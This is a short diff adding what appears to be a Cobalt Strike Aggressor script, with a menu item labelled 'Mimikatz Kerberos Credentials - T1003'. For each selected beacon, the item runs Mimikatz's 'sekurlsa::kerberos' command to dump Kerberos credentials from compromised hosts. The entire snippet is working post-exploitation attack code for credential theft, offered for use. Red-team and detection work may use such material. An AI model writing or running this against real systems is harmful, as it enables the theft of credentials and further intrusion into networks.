@@ -1,0 +1,13 @@
+item "Mimikatz Kerberos Credentials  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberos($bid);
+				}
+			}
+			
+			
+sub kerberos{
+
+bmimikatz($1, "sekurlsa::kerberos");
+
+}			
